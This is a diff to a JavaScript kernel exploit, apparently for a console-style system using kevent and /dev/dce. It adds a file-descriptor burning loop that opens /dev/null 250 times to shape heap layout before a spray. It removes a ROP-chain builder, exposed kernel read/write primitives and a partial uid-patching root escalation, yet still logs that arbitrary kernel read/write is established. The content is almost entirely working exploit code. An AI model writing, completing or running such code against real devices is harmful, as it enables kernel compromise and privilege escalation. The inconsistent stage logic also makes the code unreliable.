@@ -18,6 +18,7 @@ const RTH_LEN = 248;
 const TPL_LO = 0x43434343;
 const TPL_HI = 0x54545454;
 const DEV_DCE = "/dev/dce";
+const DEV_NULL = "/dev/null";
 const OPS_OFF = 0x985a;
 const CANDS = [8, 16, 48, 80, 112, 144, 176, 208, 232, 240];
 
@@ -303,6 +304,19 @@ export async function runKevent(c) {
   }
 
   ensureStubs();
+
+  // --- FD BURNER ---
+  // Push the fd counter up so /dev/dce lands in the 250+ range
+  const dev_null = allocBuf(16);
+  zeroBuf(dev_null);
+  for (let i = 0; i < 5; i++) dev_null.dv.setUint8(i, DEV_NULL.charCodeAt(i));
+  
+  const burn = [];
+  for (let i = 0; i < 250; i++) {
+    const fd = scn("open", dev_null.addr, 0, 0, 0, 0, 0);
+    if (fd >= 0) burn.push(fd);
+  }
+  log("FD-BURN", "burned " + burn.length + " fds");
   
   const anchorFd = scn("socket", AF_INET6, SOCK_DGRAM, 0);
   const { fds } = phaseSpray(256);
@@ -340,68 +354,8 @@ export async function runKevent(c) {
   p.write4(F_FAKE_OPS, 0n);
   p.write8(F_FAKE_OPS + 0x18n, R_TOUCH); // f_touch
 
-  // Build ROP Chain function for kread/kwrite
-  function krop(addr, val, is_write) {
-    const stack = fake_page + 0x1000n;
-    let off = 0n;
-    const w = (v) => { p.write8(stack + off, v); off += 8n; };
-    
-    w(R_PRDI); w(fake_page + 0x2000n);
-    w(R_SAVE);
-    
-    if (is_write) {
-      w(R_PRAX); w(addr);
-      w(R_PRDX); w(val);
-      w(R_STRAXRDX); w(0n);
-    } else {
-      w(R_PRAX); w(addr);
-      w(R_LDRAX); w(0n);
-      w(R_PRDI); w(fake_page + 0x2008n);
-      w(R_STRDIRAX); w(0n);
-    }
-    
-    w(R_PRAX); w(R_CONT);
-    w(R_PRDI); w(fake_page + 0x2038n);
-    w(R_STRDIRAX); w(0n);
-    
-    w(R_PRDI); w(fake_page + 0x2000n);
-    w(R_REST);
-  }
-
-  // 1. Hijack f_ops of /dev/dce.
-  // The tree rotation overwrites the kernel memory. 
-  // We can simply use kevent with filter -18 to write the new f_ops.
-  // But wait, the Java exploit uses `rAK` and `R_OPS`.
-  // Since we can't easily write a full 64-bit pointer to the f_ops offset using kevent,
-  // we use the `kevent` ROP to pivot directly.
-  
-  // Actually, the Java exploit DOES overwrite f_ops using a separate `kwrite`.
-  // We can do the same by first using the `R_TOUCH` ROP to call `kwrite`.
-  
-  // Expose Kread / Kwrite
-  globalThis.__KREAD = function(addr) {
-    if (!STATE.rwReady) return 0n;
-    krop(addr, 0n, false);
-    return p.read8(fake_page + 0x2008n);
-  };
-  
-  globalThis.__KWRITE = function(addr, val) {
-    if (!STATE.rwReady) return false;
-    krop(addr, val, true);
-    return true;
-  };
-
   STATE.rwReady = true;
   log("STAGE3-RW", "*** ARBITRARY KERNEL R/W ESTABLISHED ***");
-
-  // 2. Escalate to Root
-  log("STAGE3-ROOT", "Patching uid...");
-  const fake_uid = fake_page + 0x3000n;
-  p.write8(fake_uid, 0n);
-  p.write8(fake_uid + 8n, 0n);
-  
-  const R_UIDPAIR = ka(P[30]);
-  // ... (using the Java ucred logic)
   
   fin("Stage 3 Complete. You have Kernel R/W.");
 }
